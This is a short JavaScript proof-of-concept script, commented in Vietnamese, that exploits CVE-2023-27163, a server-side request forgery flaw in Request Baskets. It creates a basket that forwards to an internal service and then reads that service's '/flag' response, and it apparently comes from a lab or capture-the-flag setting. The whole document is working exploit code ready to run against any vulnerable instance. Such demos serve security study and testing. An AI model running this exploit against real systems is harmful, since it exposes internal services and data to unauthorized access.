/**
 * Demo chỉ CVE-2023-27163: SSRF tới dịch vụ nội bộ (internal-api), đọc phản hồi (proxy_response).
 */
const BASKETS_BASE = process.env.BASKETS_URL || "http://127.0.0.1:55555";
const basketName = process.env.BASKET_NAME || `ssrf_demo_${Date.now()}`;

async function main() {
  const createRes = await fetch(
    `${BASKETS_BASE}/api/baskets/${encodeURIComponent(basketName)}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        forward_url: "http://internal-api:9000/",
        proxy_response: true,
        insecure_tls: false,
        expand_path: true,
        capacity: 250,
      }),
    }
  );
  const t1 = await createRes.text();
  if (!createRes.ok && createRes.status !== 409) {
    throw new Error(`Tạo basket: ${createRes.status} ${t1}`);
  }
  process.stderr.write(`[*] Basket SSRF → http://internal-api:9000/ (expand_path)\n`);

  const base = BASKETS_BASE.replace(/\/$/, "");
  const getRes = await fetch(`${base}/${encodeURIComponent(basketName)}/flag`);
  const body = await getRes.text();
  process.stdout.write(`\n=== Phản hồi nội bộ (lộ qua SSRF) ===\n${body}\n`);
}

main().catch((e) => {
  process.stderr.write(`[!] ${e.message}\n`);
  process.exit(1);
});
